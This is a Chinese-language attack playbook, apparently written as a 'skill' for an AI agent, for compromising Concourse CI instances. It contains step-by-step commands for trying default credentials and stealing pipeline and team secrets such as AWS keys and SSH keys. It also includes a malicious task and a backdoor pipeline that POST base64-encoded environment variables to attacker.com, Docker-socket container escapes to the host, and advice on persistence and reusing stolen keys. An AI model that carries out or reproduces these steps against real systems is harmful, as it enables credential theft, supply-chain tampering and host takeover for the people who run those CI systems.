---
name: concourse-attack
type: attack
category: cicd
platform: concourse
severity: high
---

# Concourse 攻击技能

## 触发条件

- 有 Concourse 凭证或 Token
- 发现 Concourse 实例
- 用户要求"攻击 Concourse"

## 前置检查

```bash
# 1. 测试连接
curl https://concourse.example.com/api/v1/info

# 2. 使用 Fly CLI
fly -t example login -c https://concourse.example.com

# 3. 列出管道
fly -t example pipelines
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 测试公共管道
curl https://concourse.example.com/api/v1/pipelines

# 2. 测试公共团队
curl https://concourse.example.com/api/v1/teams

# 3. 测试默认凭证
# 常见默认用户: admin, test, concourse
fly -t example login -c https://concourse.example.com -u admin -p admin
```

### 方法 2: Pipeline 变量窃取

```bash
# 1. 获取所有管道
fly -t example pipelines

# 2. 获取管道详情
fly -t example get-pipeline -p PIPELINE_NAME

# 3. 查看管道配置（包含变量）
fly -t example expose-pipeline -p PIPELINE_NAME

# 4. 通过 API 获取管道
curl -H "Authorization: Bearer $TOKEN" \
  https://concourse.example.com/api/v1/teams/TEAM/pipelines/PIPELINE_NAME/config
```

### 方法 3: 私有密钥利用

```bash
# 1. 列出所有团队
fly -t example teams

# 2. 获取团队的私有密钥
curl -H "Authorization: Bearer $TOKEN" \
  https://concourse.example.com/api/v1/teams/TEAM_NAME/vars

# 3. 提取敏感变量
curl -H "Authorization: Bearer $TOKEN" \
  https://concourse.example.com/api/v1/teams/TEAM_NAME/pipelines/PIPELINE_NAME/vars

# 4. 常见敏感变量:
# - aws_access_key_id, aws_secret_access_key
# - private_key, ssh_key
# - api_token, api_key
# - password, secret
```

### 方法 4: Job 篡改

```bash
# 1. 列出所有 Job
fly -t example jobs -p PIPELINE_NAME

# 2. 获取 Job 配置
fly -t example get-pipeline -p PIPELINE_NAME | jq '.jobs[] | select(.name=="JOB_NAME")'

# 3. 检查 Job 的计划（plan）
# 可能包含:
# - get: 获取资源（git, s3, etc）
# - put: 推送资源
# - task: 执行任务
# - load_var: 加载变量

# 4. 如果有 set_pipeline 任务
# 可以修改管道配置
```

### 方法 5: Resource 利用

```bash
# 1. 列出管道的所有资源
fly -t example get-pipeline -p PIPELINE_NAME | jq '.resources[]'

# 2. 常见资源类型:
# - git: Git 仓库
# - s3: S3 存储桶
# - docker-image: Docker 镜像
# - registry: Docker Registry
# - github-release: GitHub Release
# - pool: 资源池

# 3. 获取资源凭证
fly -t example get-pipeline -p PIPELINE_NAME | jq '.resources[] | select(.type=="git") | .source'

# 4. 提取 Git 凭证
# 可能包含: private_key, username, password, access_token
```

### 方法 6: Task 脚本注入

```bash
# 1. 获取任务的运行配置
fly -t example get-pipeline -p PIPELINE_NAME | jq '.jobs[].plan[] | select(.task=="TASK_NAME")'

# 2. 检查任务脚本
# 任务可能包含: run.path, run.args, file

# 3. 如果可以修改 Git 仓库
# 在 .concourse/tasks/ 目录下注入恶意脚本

cat > malicious_task.yml <<'EOF'
platform: linux
image_resource:
  type: registry-image
  source: {repository: alpine}
inputs:
- name: repo
run:
  path: sh
  args:
  - -c
  - |
    apk add --no-cache curl
    curl -X POST https://attacker.com/exfil -d "$(env | base64)"
EOF
```

### 方法 7: Build 窃取

```bash
# 1. 列出最近的构建
fly -t example builds -p PIPELINE_NAME

# 2. 获取构建日志
fly -t example watch -j PIPELINE_NAME/JOB_NAME -b BUILD_ID

# 3. 获取构建输出
curl -H "Authorization: Bearer $TOKEN" \
  https://concourse.example.com/api/v1/teams/TEAM/pipelines/PIPELINE_NAME/jobs/JOB_NAME/builds/BUILD_ID/events

# 4. 下载构建产物
curl -H "Authorization: Bearer $TOKEN" \
  https://concourse.example.com/api/v1/teams/TEAM/pipelines/PIPELINE_NAME/jobs/JOB_NAME/builds/BUILD_ID/plan
```

### 方法 8: Worker 利用

```bash
# 1. 列出所有 Worker
fly -t example workers

# 2. 获取 Worker 状态
fly -t example workers --details

# 3. 如果有 Garden 或 Baggageclaim 访问
# 可以执行容器操作

# 4. 检查 Worker 的平台和标签
fly -t example workers | grep -E "platform|tags"
```

### 方法 9: 容器逃逸

```bash
# 1. 如果在特权容器中运行
# 尝试逃逸到宿主机

# 2. 检查是否挂载了 Docker socket
ls -la /var/run/docker.sock

# 3. 如果有 Docker socket 访问
# 可以运行特权容器
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# 4. 或直接访问宿主机文件系统
docker run -it -v /:/mnt/host alpine chroot /mnt/host
```

### 方法 10: Pipeline 后门

```bash
# 1. 创建恶意管道
cat > malicious_pipeline.yml <<'EOF'
resources:
- name: malicious-repo
  type: git
  source:
    uri: https://github.com/attacker/malicious.git
    branch: main

jobs:
- name: exfil-job
  plan:
  - get: malicious-repo
  - task: exfil-secrets
    config:
      platform: linux
      image_resource:
        type: registry-image
        source: {repository: alpine}
      run:
        path: sh
        args:
        - -c
        - |
          apk add --no-cache curl
          curl -X POST https://attacker.com/exfil \
            -d "pipeline: $PIPELINE_NAME" \
            -d "build: $BUILD_ID" \
            -d "team: $TEAM_NAME" \
            -d "$(env | base64)"
EOF

# 2. 设置管道
fly -t example set-pipeline -p malicious -c malicious_pipeline.yml

# 3. 暴露管道
fly -t example expose-pipeline -p malicious

# 4. 触发构建
fly -t example trigger-job -j malicious/exfil-job
```

## 验证成功

```bash
# 成功登录
fly -t example login -c https://concourse.example.com

# 成功列出管道
fly -t example pipelines

# 成功获取管道配置
fly -t example get-pipeline -p PIPELINE_NAME
```

## 下一步

1. 分析窃取的变量和凭证
2. 使用获取的密钥访问 Git 仓库、S3 等
3. 通过 Pipeline 建立持久化
4. 攻击关联的容器和云资源
